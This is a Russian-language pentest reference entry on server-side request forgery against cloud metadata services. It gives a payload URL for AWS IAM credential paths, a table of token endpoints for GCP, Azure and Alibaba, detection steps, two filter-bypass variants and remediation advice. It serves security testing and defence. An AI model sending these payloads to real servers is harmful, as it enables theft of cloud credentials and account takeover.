---
id: ssrf-cloud-metadata-169254
title: "SSRF: обращение к cloud metadata (169.254.169.254)"
type: ssrf
target: cloud
category: cloud
difficulty: intermediate
bypass: none
tags: [ssrf, cloud, metadata, imds]
tested_on: ["AWS IMDSv1", "GCP metadata", "Azure IMDS"]
success_rate: 0.6
risk: high
cwe: "CWE-918"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
  - "https://portswigger.net/web-security/ssrf"
graph:
  - target: "ssrf"
    type: instance_of
  - target: "cloud"
    type: related_to
  - target: "privilege-escalation"
    type: leads_to
    description: "IAM-роль инстанса = доступ к облачному аккаунту"
---

# SSRF: обращение к cloud metadata (169.254.169.254)

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Explanation

Link-local адрес `169.254.169.254` — точка доступа к метаданным облачного инстанса.
Если сервер выполняет запрос по URL из пользовательских данных (превью картинок,
импорт по ссылке, webhook), атакующий читает IAM-роль инстанса и получает временные
ключи доступа ко всему аккаунту. Это самый дорогостоящий класс SSRF.

| Провайдер | Путь |
|-----------|------|
| AWS (IMDSv1) | `/latest/meta-data/iam/security-credentials/<role>` |
| GCP | `/computeMetadata/v1/instance/service-accounts/default/token` (заголовок `Metadata-Flavor: Google`) |
| Azure | `/metadata/identity/oauth2/token?api-version=2018-02-01&resource=...` (заголовок `Metadata: true`) |
| Alibaba Cloud | `/latest/meta-data/ram/security-credentials/` |

## Detection

1. Найдите параметры с URL (`url=`, `src=`, `image=`, `feed=`, `callback=`, `dest=`).
2. Подставьте свой контролируемый хост — пришёл ли запрос (это подтверждает SSRF).
3. Затем пробуйте `169.254.169.254` и его обходы.
Инструменты: Burp Collaborator, `interactsh`.

## Remediation

- Whitelist доменов/схем для исходящих запросов (не blacklist IP).
- AWS: принудительный IMDSv2 (`HttpTokens: required`, `HttpPutResponseHopLimit: 1`).
- Egress-фильтрация: контейнеры/хосты не должны ходить на link-local и во внешку без нужды.
- Минимальные права IAM-роли инстанса; отдельные роли на задачу.
- Запрет редиректов или их повторная валидация.

## Variants

```
http://[::ffff:169.254.169.254]/latest/meta-data/
```

```
http://169.254.169.254.nip.io/latest/meta-data/
```
